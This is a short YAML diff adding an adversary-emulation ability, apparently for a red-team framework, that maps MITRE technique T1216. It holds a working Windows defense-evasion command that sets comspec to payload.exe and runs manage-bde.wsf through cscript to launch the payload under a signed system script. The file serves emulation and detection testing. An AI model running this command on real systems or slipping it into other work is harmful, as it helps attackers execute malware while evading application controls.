@@ -1,0 +1,25 @@
+- id: f683c6be-0f75-f3dd-4b8c-f99d8abcd7ea
+  name: Manage-bde.wsf - Set the comspec variable to another executable prior to calling
+    manage-bde.wsf for execution.
+  description: Set the comspec variable to another executable prior to calling manage-bde.wsf
+    for execution.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1216
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: set comspec=payload.exe & cscript c:\windows\system32\manage-bde.wsf
+        payloads:
+        - payload.exe
+  singleton: false
+  privilege: Elevated
+  repeatable: true
+  buckets:
+  - defense-evasion
+  version: '1.0'
+  author: Oddvar Moe
+  created: '2018-05-25'
+  modified: '2018-05-25'
+  operating_system: Windows All Versions
